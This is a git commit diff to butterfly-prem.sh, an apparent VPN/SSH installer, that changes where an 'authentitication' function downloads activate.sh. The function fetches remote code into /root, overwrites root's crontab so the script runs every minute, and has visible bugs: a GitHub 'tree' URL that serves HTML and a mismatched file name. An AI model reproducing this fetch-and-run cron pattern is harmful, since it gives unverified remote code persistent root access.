e37a1b71b7ba9f0d7cb0967f0b4055973520814d
EskalarteDexter <88998149+EskalarteDexter@users.noreply.github.com>
2022-04-24 08:26:18 +0800

    Update butterfly-prem.sh

--- butterfly-prem.sh
+++ butterfly-prem.sh
@@ -1692,7 +1692,7 @@ rm -f *
 }
 
 function authentitication() {
-wget -O /root/activate.sh "script.mediatek-vpn.com/ssh/butterfly/prem/activate.sh"
+wget -O /root/activate.sh "https://github.com/EskalarteDexter/Private_Script/tree/main/prem/activate.sh"
 echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 sh active.sh | tee -a /root/activate.sh
 }
